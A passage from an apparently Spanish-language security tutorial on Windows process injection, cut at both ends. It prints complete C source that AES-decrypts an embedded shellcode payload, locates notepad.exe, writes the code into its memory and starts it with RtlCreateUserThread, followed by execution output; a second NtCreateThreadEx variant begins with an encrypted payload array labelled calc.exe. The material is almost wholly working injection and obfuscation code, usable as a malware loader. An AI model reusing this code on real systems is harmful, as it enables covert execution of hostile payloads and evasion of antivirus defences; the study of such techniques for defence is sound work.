	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
	<span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
	<span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
	<span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido</span>
                
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
                
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess: ] %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"Process Found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
                
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot</span>
                
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">Inject</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>

	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">CLIENT_ID</span> <span class="n">cid</span><span class="p">;</span>
	<span class="c1">// Inyeccion tipo2 pRtlCreateUserThread</span>
	<span class="n">RtlCreateUserThread_t</span> <span class="n">pRtlCreateUserThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">RtlCreateUserThread_t</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"NTDLL.DLL"</span><span class="p">),</span> <span class="s">"RtlCreateUserThread"</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">// Inyeccion tipo2 pRtlCreateUserThread</span>
	<span class="n">pRtlCreateUserThread</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cid</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>



<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p>Salida de la ejecución:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>external_injection_exe_2.exe
[FindProcess: ] System
[FindProcess: ] Registry
[FindProcess: ] smss.exe
[FindProcess: ] csrss.exe
[FindProcess: ] wininit.exe
[FindProcess: ] csrss.exe
[FindProcess: ] winlogon.exe
[FindProcess: ] services.exe
[FindProcess: ] lsass.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] fontdrvhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dwm.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] VBoxService.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] Memory Compression
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] spoolsv.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ruby.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] wlms.exe
[FindProcess: ] svchost.exe
[FindProcess: ] MsMpEng.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sppsvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] SppExtComObj.Exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] sihost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] taskhostw.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ctfmon.exe
[FindProcess: ] svchost.exe
[FindProcess: ] explorer.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ShellExperienceHost.exe
[FindProcess: ] SearchUI.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] YourPhone.exe
[FindProcess: ] SkypeApp.exe
[FindProcess: ] SkypeBackgroundHost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SearchIndexer.exe
[FindProcess: ] smartscreen.exe
[FindProcess: ] cmd.exe
[FindProcess: ] conhost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SecurityHealthSystray.exe
[FindProcess: ] SecurityHealthService.exe
[FindProcess: ] VBoxTray.exe
[FindProcess: ] WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe
[FindProcess: ] OneDrive.exe
[FindProcess: ] svchost.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] msedge.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad++.exe
[FindProcess: ] svchost.exe
[FindProcess: ] ApplicationFrameHost.exe
[FindProcess: ] WinStore.App.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] SystemSettings.exe
[FindProcess: ] SgrmBroker.exe
[FindProcess: ] uhssvc.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] WmiPrvSE.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] dllhost.exe
[FindProcess: ] ProcessHacker.exe
[FindProcess: ] Microsoft.Photos.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] dllhost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] RuntimeBroker.exe
[FindProcess: ] svchost.exe
[FindProcess: ] svchost.exe
[FindProcess: ] notepad.exe
Process Found!
Notepad.exe PID = 2960
</code></pre></div></div>

<p>Evidencia de la inyección:</p>

<p><img src="/assets/images/inyeccion_proceso_externo_2.png" alt="inyección_proceso_externo" /></p>

<h4 id="pntcreatethreadex">pNtCreateThreadEx()</h4>

<p>Inyección del tipo 3 desde un binario: pNtCreateThreadEx</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span 